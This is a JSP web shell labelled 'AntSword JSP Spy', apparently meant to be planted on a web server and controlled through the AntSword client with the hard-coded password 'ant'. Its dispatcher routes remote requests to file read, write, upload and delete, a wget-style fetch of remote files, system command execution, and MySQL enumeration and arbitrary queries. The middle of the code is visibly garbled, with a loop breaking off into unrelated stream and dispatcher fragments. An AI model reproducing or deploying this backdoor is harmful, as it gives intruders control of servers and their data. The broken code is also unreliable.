<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
  /**
  *  AntSword JSP Spy
  *
  *  AntSword 最低版本：v1.1-dev,使用方式 custom 模式连接
  *  Date: 2016/03/26 v1
  *   1. 文件系统 和 terminal 管理
  *   2. mysql 数据库支持
  *   3. 支持 base64 和 hex 编码
  **/
  String Pwd = "ant";   //连接密码
	String encoder = "base64"; // 数据编码
	//String encoder = "hex";
  String cs = "UTF-8";
  String EC(String s) throws Exception {
		if(encoder.equals("hex") || encoder == "hex") return s;
		return new String(s.getBytes("ISO-8859-1"), cs);
	}
	String showDatabases(String encode, String conn) throws Exception {
		String sql = "show databases"; // mysql
		String columnsep = "\t";
		String rowsep = "";
		return executeSQL(encode, conn, sql, columnsep, rowsep, false);
	}
	String showTables(String encode, String conn, String dbname) throws Exception {
		String sql = "show tables from " + dbname; // mysql
		String columnsep = "\t";
		String rowsep = "";
		return executeSQL(encode, conn, sql, columnsep, rowsep, false);
	}
	String showColumns(String encode, String conn, String dbname, String table) throws Exception {
		String columnsep = "\t";
		String rowsep = "";
		String sql = "select * from " + dbname + "." + table + " limit 0,0"; // mysql
		return executeSQL(encode, conn, sql, columnsep, rowsep, true);
	}
	String query(String encode, String conn, String sql) throws Exception {
		String columnsep = "\t|\t"; // general
		String rowsep = "\r\n";
		return executeSQL(encode, conn, sql, columnsep, rowsep, true);
	}
	String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
			throws Exception {
		String ret = "";
		conn = (EC(conn));
		String[] x = conn.trim().replace("\r\n", "\n").split("\n");
		Class.forName(x[0].trim());
		String url = x[1] + "&characterEncoding=" + decode(EC(encode),encoder);
		Connection c = DriverManager.getConnection(url);
		Statement stmt = c.createStatement();
		ResultSet rs = stmt.executeQuery(sql);
		ResultSetMetaData rsmd = rs.getMetaData();
		if (needcoluname) {
			for (int i = 1; i <= rsmd.getColumnCount(); i++) {
				String columnName = rsmd.getColumnName(i);
				ret += columnName + columnsep;
			}
			ret += rowsep;
		}
		while (rs.next()) {
			for (int i = 1; i <= rsmd.getColumnCount(); i++) {
				String columnValue = rs.getString(i);
				ret += columnValue + columnsep;
			}
			ret += rowsep;
		}
		return ret;
	}
	String WwwRootPathCode(HttpServletRequest r) throws Exception {
		String d = r.getSession().getServletContext().getRealPath("/");
		String s = "";
		if (!d.substring(0, 1).equals("/")) {
			File[] roots = File.listRoots();
			for (int i = 0; i < roots.length; i++) {
				s += roots[i].toString().substring(0, 2) + "";
			}
		} else {
			s += "/";
		}
		return s;
	}
	String FileTreeCode(String dirPath) throws Exception {
		File oF = new File(dirPath), l[] = oF.listFiles();
		String s = "", sT, sQ, sF = "";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = ").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("");
		if (funccode.equals("B")) {
			sb.append(FileTreeCode(pars[1]));
		} else if (funccode.equals("C")) {
			sb.append(ReadFileCode(pars[1]));
		} else if (funccode.equals("D")) {
			sb.append(WriteFileCode(pars[1], pars[2]));
		} else if (funccode.equals("E")) {
			sb.append(DeleteFileOrDirCode(pars[1]));
		} else if (funccode.equals("F")) {
			DownloadFileCode(pars[0], response);
		} else if (funccode.equals("U")) {
			sb.append(UploadFileCode(pars[1], pars[2]));
		} else if (funccode.equals("H")) {
			sb.append(CopyFileOrDirCode(pars[1], pars[2]));
		} else if (funccode.equals("I")) {
			sb.append(RenameFileOrDirCode(pars[1], pars[2]));
		} else if (funccode.equals("J")) {
			sb.append(CreateDirCode(pars[1]));
		} else if (funccode.equals("K")) {
			sb.append(ModifyFileOrDirTimeCode(pars[1], pars[2]));
		} else if (funccode.equals("L")) {
			sb.append(WgetCode(pars[1], pars[2]));
		} else if (funccode.equals("M")) {
			sb.append(ExecuteCommandCode(pars[1], pars[2]));
		} else if (funccode.equals("N")) {
			sb.append(showDatabases(pars[0], pars[1]));
		} else if (funccode.equals("O")) {
			sb.append(showTables(pars[0], pars[1], pars[2]));
		} else if (funccode.equals("P")) {
			sb.append(showColumns(pars[0], pars[1], pars[2], pars[3]));
		} else if (funccode.equals("Q")) {
			sb.append(query(pars[0], pars[1], pars[2]));
		} else if (funccode.equals("A")) {
			sb.append(SysInfoCode(request));
		}
	} catch (Exception e) {
		sb.append("ERROR" + "://" + e.toString());
	}
	sb.append("|<-");
	out.print(sb.toString());
%>
